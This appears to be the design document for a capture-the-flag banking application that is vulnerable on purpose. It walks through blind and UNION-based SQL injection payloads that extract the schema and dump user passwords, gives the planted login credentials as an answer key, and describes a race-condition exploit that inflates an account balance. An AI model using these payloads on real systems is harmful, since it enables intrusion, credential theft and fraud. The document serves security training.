## Task flow
The description of what is expected of the user with respect to different task stages.

### Task 0: Getting the username
The user is presented with a login page with the option to check whether a given username available.
This way, the player can get an existing username by investigating the database schema.
 - **Scenario:**:
   The base query behind the endpoint is as follows: `SELECT * FROM users WHERE username = <userinput>`.
   If any records are present, API returns a POJO `{"exists": true}`, and an appropriate message is visible in the frontend.
 - **Objective:**:
   - Use SQL injection to get the username of the first user in the database.
   - Use a non-existing username with `UNION` to get to database name, schema, table name, and username.
   Reference: https://tryhackme.com/r/room/sqlinjectionlm
 - **Issues/Questions**:
   - Technically the player could the password this way as well, but we can make it looooooong and hard to guess.

#### Steps
Note that user input starts where `SELECT * FROM users where username ='` ends, so for example the first step resolves to
```sql
SELECT * FROM users WHERE username = 'nonexisting'
```
1. Enter a username that does not exist in the database, to default to a `false` response.  
```bash
GET localhost:8080/auth/exists?username=nonexisting' --
```
2. Figure out the number of columns for the `UNION` statement to work. The player keeps appending more numbers until the response is `true`.
```bash
GET localhost:8080/auth/exists?username=nonexisting' UNION SELECT '1','2','3' --
```
3. Get the database name. The player starts with the `like '%'` stub and then keeps adding subsequent letters.
When the response changes to `true`, the guess is correct, and the next letter can be targeted. 
```bash
GET localhost:8080/auth/exists?username=nonexisting' UNION SELECT '1','2','3' WHERE current_database() like 'bankdb%25' --;
```
Note that `%25` is the URL encoded version of `%`.
4. Get the table name. The player starts with the `like '%'` stub and then keeps adding subsequent letters.
When the response changes to `true`, the guess is correct, and the next letter can be targeted. 
```bash
GET localhost:8080/auth/exists?username=nonexisting' UNION SELECT '1','2','3' FROM information_schema.tables WHERE table_catalog = 'bankdb' AND table_name like 'bank_user%25' --;
```
5. Get the username. The player starts with the `like '%'` stub and then keeps adding subsequent letters.
When the response changes to `true`, the guess is correct, and the next letter can be targeted. 
```bash
GET localhost:8080/auth/exists?username=nonexisting' UNION SELECT '1','2','3' FROM bank_user WHERE username like 'user%25' --;
```
### Task 1: The login page
The user is presented with a login page and has to utilise the provided passwords text file and burp to execute a brute force attack.
 - **Scenario:** User password is simple and common and can be found in the provided passwords file.
 - **Objective:** Use burp to intercept the request and use the provided passwords file to find the correct password.
   - Username: `user`
   - Password: `dragon`
### Task 2: Listing all the users and their passwords
 - **Scenario:** A search box allows players to search for transactions by the title and concatenates the search input directly into the SQL query.
 - **Objective:** Perform an SQL injection to access unauthorized data. The user is expected to enter a query which results in the following request:
   ```bash
   GET localhost:8080/transactions/searchByTitle?title=XD' UNION SELECT '1', bu.*, '2' from bank_user bu--
   ```

### Task 3: TOCTOU exploitiation
When the user is logged in, his goal is to exploit time-of-check to time-of-use vulnerability. 
 - **Scenario:** The implementation of transfering money between accounts doesn't have any of thread synchronization methods. User can take advantage of this fact to multiply his bank bilance.
 - **Objective:** Use burp intruder to intercept request used for submitting a transaction and utilize this request in repeater module. Sending multiple requests in the same time (using parallel mode) will lead to race condition. The user's goal is to reach 1000$ on one of "user" bank accounts. 

 - **Important**: Player has to be logged in as "user" account using credentials obtained during previous part of this challenge. Player can't transfer money from any other user account to prevent scenario, in which player is registering new accounts and transfering money to "user" account until he reaches amount of money needed for getting the flag. 